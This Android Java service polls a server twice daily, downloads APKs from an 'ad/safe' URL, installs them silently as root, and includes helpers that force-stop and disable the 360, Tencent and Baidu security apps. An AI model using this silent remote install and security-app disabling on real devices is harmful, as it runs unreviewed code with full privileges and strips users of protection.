package com.bb_sz.autonotify.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;

import com.bb_sz.autonotify.http.CheckSafeModel;
import com.bb_sz.autonotify.http.CheckSafeResponse;
import com.bb_sz.autonotify.http.RunInfoModel;
import com.bb_sz.autonotify.http.RunInfoResponse;
import com.bb_sz.autonotify.receiver.ACTReceiver;
import com.bb_sz.lib.http.BaseModel;
import com.bb_sz.lib.http.Http;
import com.bb_sz.lib.http.HttpResponse;
import com.bb_sz.lib.http.HttpResponseBody;
import com.bb_sz.lib.http.IHttpCallback;
import com.bb_sz.lib.log.FileUtils;
import com.bb_sz.lib.log.L;
import com.google.gson.Gson;

import org.json.JSONArray;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class MyCoreService extends Service {
    private static final String TAG = "SkyNotify";
    final String[] phoneNames = {"HM NOTE 1LTE 0", "HM NOTE 1LTE 2", "HM NOTE 1LTE 3", "HM NOTE 1LTE 4"};
    boolean isRun = false;
    private final static String m360pkg = "com.qihoo360.mobilesafe";
    private final static String mqqpkg = "com.tencent.qqpimsecure";
    private final static String mbdpkg = "cn.opda.a.phonoalbumshoushou";

    private final static String m360Launcher = ".ui.index.AppEnterActivity";
    private final static String mqqLauncher = "com.tencent.server.fore.QuickLoadActivity";
    private final static String mbdLauncher = "cn.com.opda.android.mainui.MainActivity";

    /**
     * 连接超时
     */
    public static final int CONNECT_TIMEOUT = 10 * 1000;
    /**
     * 数据交互超时
     */
    public static final int DATA_TIMEOUT = 30 * 1000;
    private DownListener mDownListener = new DownListener() {
        @Override
        public void success(CheckSafeResponse response, String localPath) {
            //open safe app
            //install app
            install(localPath);
        }

        @Override
        public void failed(CheckSafeResponse response, String localPath) {

        }
    };
    private final String netPath = "http://www.bb-sz.com/ad/safe/";
    private Thread mThread;

    private void install(String localPath) {
        openQQGuanJia();
        doSuExec(new String[]{"pm install -r " + localPath});
    }

    private void uninstall(String pkg) {
        if (TextUtils.isEmpty(pkg)) return;
        doSuExec(new String[]{"pm uninstall " + pkg});
    }


    public MyCoreService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        isRun = true;
        if (null != mThread) {
            mThread = null;
        }
        mThread = new Thread(new Runnable() {
            @Override
            public void run() {
                Thread current = Thread.currentThread();
                Log.i("skyAutoNotify", "onStartCommand()...." + current.getId() + ", main thread id is " + mThread.getId());
                while (current.getId() == mThread.getId()) {
                    Log.i("skyAutoNotify", "onStartCommand(), run...." + current.getId());
                    checkApk();
                    try {
                        Thread.sleep(1000 * 60 * 30);
                    } catch (InterruptedException ignored) {
                    }
                }
            }
        });
        mThread.start();
        return START_STICKY;
    }

    private void checkApk() {
        if (isRightTime()) {
            ACTReceiver.sendInfoToWx(this, "start_check_safe");
            BaseModel model = new CheckSafeModel(new IHttpCallback() {
                @Override
                public void result(HttpResponse httpResponse) {
                    if (null != httpResponse && httpResponse.code == 200) {
                        HttpResponseBody body = httpResponse.getBody();
                        if (null != body) {
                            String str = body.getString();
                            if (!TextUtils.isEmpty(str) && str.contains(",")) {
                                String[] array = str.split(",");
                                int length = array.length;
                                try {
                                    if (length == 0) {
                                        ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_safe_0");
                                        return;
                                    }
                                    for (int i = 0; i < length; i++) {
                                        final String fileName = array[i];
                                        String name = fileName.split("_")[0];
                                        String path = netPath + fileName;
                                        String cid = fileName.split("_")[1];
                                        CheckSafeResponse response = new CheckSafeResponse();
                                        response.setName(name);
                                        response.setCid(cid);
                                        response.setPath(path);
                                        response.setPkg(fileName);
                                        Log.i(TAG, "i = " + i + ", result is : " + response.toString());
                                        //clear local apk
                                        //down apk
//                                        uninstall(response.getPkg());
                                        ACTReceiver.pkg = response.getName() + "_" + response.getCid() + "_BD";
                                        try {
                                            Thread.sleep(1000 * 10);
                                        } catch (InterruptedException ignored) {
                                        }
                                        download(response, mDownListener);
                                        try {
                                            Thread.sleep(1000 * 40);
                                        } catch (InterruptedException ignored) {
                                        }
                                    }
                                    ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_safe");
                                    return;
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_err_apk");
                                    return;
                                }
                            }
                        }
                        ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_null_apk");
                    }
                }
            });
            Http.getInstance().request(model.toHttpEntry());
            try {
                Thread.sleep(1000 * 60 * 30);
            } catch (InterruptedException ignored) {
            }
        }
    }

    private void openQQGuanJia() {
        String[] cmd = {"am start -n com.tencent.qqpimsecure/com.tencent.server.fore.QuickLoadActivity"};
        doSuExec(cmd);
    }

    private static boolean isRightTime() {
        Calendar cal = Calendar.getInstance();
        int hour = cal.get(Calendar.HOUR_OF_DAY);
        Log.i("hour", "" + hour);
        return hour == 9 || hour == 21;
    }

    private void _checkApk() {
        while (isRun) {
            ACTReceiver.sendInfoToWx(this, "start_check_safe");
            BaseModel model = new CheckSafeModel(new IHttpCallback() {
                @Override
                public void result(HttpResponse httpResponse) {
                    if (null != httpResponse && httpResponse.code == 200) {
                        HttpResponseBody body = httpResponse.getBody();
                        if (null != body) {
                            String str = body.getString();
                            if (!TextUtils.isEmpty(str)) {
                                try {
                                    JSONArray array = new JSONArray(str);
                                    int length = array.length();
                                    if (length == 0) {
                                        ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_safe_0");
                                        return;
                                    }
                                    for (int i = 0; i < length; i++) {
                                        CheckSafeResponse response = new Gson().fromJson(array.getJSONObject(i).toString(), CheckSafeResponse.class);
                                        if (null != response) {
                                            Log.i(TAG, "i = " + i + ", result is : " + response.toString());
                                            //clear local apk
                                            //down apk
                                            uninstall(response.getPkg());
                                            ACTReceiver.pkg = response.getName() + "_" + response.getCid() + "_BD";
                                            try {
                                                Thread.sleep(1000 * 10);
                                            } catch (InterruptedException ignored) {
                                            }
                                            download(response, mDownListener);
                                            try {
                                                Thread.sleep(1000 * 60 * 2);
                                            } catch (InterruptedException ignored) {
                                            }
                                        }
                                    }
                                    ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_safe");
                                    return;
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_err_apk");
                                    return;
                                }
                            }
                        }
                        ACTReceiver.sendInfoToWx(MyCoreService.this, "end_check_null_apk");
                    }
                }
            });
            Http.getInstance().request(model.toHttpEntry());
            try {
                Thread.sleep(1000 * 60 * 60 * 12);// 十二小时监测一次
            } catch (InterruptedException ignored) {
            }
        }
    }

    private String getLocalPath(CheckSafeResponse response) {
        return "/sdcard/Download/Safe/" + response.getPkg()/* + "_" + response.getCid()  + ".apk"*/;
    }

    private void startAllSafeApp() {
        //check 360
        enableApp(m360pkg);
        startApp(m360pkg, m360Launcher);
        //check tencent
        enableApp(mqqpkg);
        startApp(mqqpkg, mqqLauncher);
        //check baidu
        enableApp(mbdpkg);
        startApp(mbdpkg, mbdLauncher);
    }

    private void stopAllSafeApp() {
        //check 360
        stopApp(m360pkg);
        disableApp(m360pkg);
        //check tencent
        stopApp(mqqpkg);
        disableApp(mqqpkg);
        //check baidu
        stopApp(mbdpkg);
        disableApp(mbdpkg);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
//        isRun = false;
    }

    private void checkRunInfo() {
        while (isRun) {
            for (int i = 0; i < phoneNames.length; i++) {
                try {
                    Thread.sleep(1000 * 60 * 3);
                } catch (InterruptedException ignored) {
                }
                final int tmp = i;
                BaseModel model = new RunInfoModel(phoneNames[i], new IHttpCallback() {
                    @Override
                    public void result(HttpResponse httpResponse) {
                        if (null != httpResponse && httpResponse.code == 200) {
                            HttpResponseBody body = httpResponse.getBody();
                            if (null != body) {
                                String str = body.getString();
                                if (!TextUtils.isEmpty(str)) {
                                    RunInfoResponse response = new Gson().fromJson(str, RunInfoResponse.class);
                                    if (null != response && isTimeOut(response.get_date())) {
//                                        sendInfoToWx(phoneNames[tmp]);
                                    }
                                }
                            }
                        }
                    }
                });
                Http.getInstance().request(model.toHttpEntry());
            }
        }
    }


    static SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    private boolean isTimeOut(String date) {
        if (TextUtils.isEmpty(date)) return false;
        try {
            Date d = sdf2.parse(date);
            long l = d.getTime();
            Log.d(TAG, "isTimeOut(), date = " + date + ", l = " + l + ", cur = " + System.currentTimeMillis());
            return System.currentTimeMillis() - l >= 1000 * 60 * 10;
        } catch (ParseException e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void startApp(String pkg, String launcher) {
        doSuExec(new String[]{"am start -n " + pkg + "/" + launcher});
    }

    public static void stopApp(String pkg) {
        doSuExec(new String[]{"am force-stop " + pkg});
    }

    public static void disableApp(String pkg) {
        doSuExec(new String[]{"pm disable " + pkg});
    }

    public static void enableApp(String pkg) {
        doSuExec(new String[]{"pm enable " + pkg});
    }


    public static void doSuExec(String[] cmds) {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            for (String cmd : cmds) {
                L.d("cmd", cmd);
                os.writeBytes(cmd + "\n");
            }
            os.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void download(CheckSafeResponse response, DownListener listener) {
        String netUrl = response.getPath();
        String localPath = getLocalPath(response);

        FileUtils.deleteFile(localPath);

        InputStream is = null;
        FileOutputStream output = null;
        HttpURLConnection http = null;
        try {
            Log.d(TAG, "download, netUrl = " + netUrl);
            Log.d(TAG, "download, localPath = " + localPath);
            File outFile = FileUtils.createFile(localPath);

            if (!outFile.exists()) {
                if (!outFile.getParentFile().exists()) {
                    outFile.getParentFile().mkdirs();
                }
                outFile.createNewFile();
            }
            output = new FileOutputStream(outFile, false);
            URL downUrl = new URL(netUrl);
            Log.d(TAG, "download, openConnection ==== ");
            http = (HttpURLConnection) downUrl.openConnection();
            http.setConnectTimeout(CONNECT_TIMEOUT);
            http.setReadTimeout(DATA_TIMEOUT);
            http.setRequestMethod("GET");
            http.setRequestProperty(
                    "Accept",
                    "image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*");
            http.setRequestProperty("Accept-Language", "zh-CN");
            http.setRequestProperty("Referer", downUrl.toString());
            http.setRequestProperty("Charset", "UTF-8");
            http.setRequestProperty(
                    "User-Agent",
                    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)");
            http.setRequestProperty("Connection", "Keep-Alive");
            http.connect();
            int length = http.getContentLength();
            Log.d(TAG, "downloadApk, length = " + length);

            int code = http.getResponseCode();
            Log.d(TAG, "downloadApk, code = " + code);
            if (code == 404 || code == 503 || code == 500) {
                listener.failed(response, localPath);
                return;
            }
            is = http.getInputStream();
            byte[] buffer = new byte[1024 * 10];
            int offset = 0;

            while ((offset = is.read(buffer, 0, 1024 * 10)) != -1) {
                output.write(buffer, 0, offset);
            }
            output.flush();
            if (outFile.length() != length) {
            }
        } catch (Exception e) {
            e.printStackTrace();
            listener.failed(response, localPath);
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (output != null) {
                try {
                    output.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != http) {
                http.disconnect();
            }
            listener.success(response, localPath);
        }
    }

    interface DownListener {
        void success(CheckSafeResponse response, String localPath);

        void failed(CheckSafeResponse response, String localPath);
    }
}
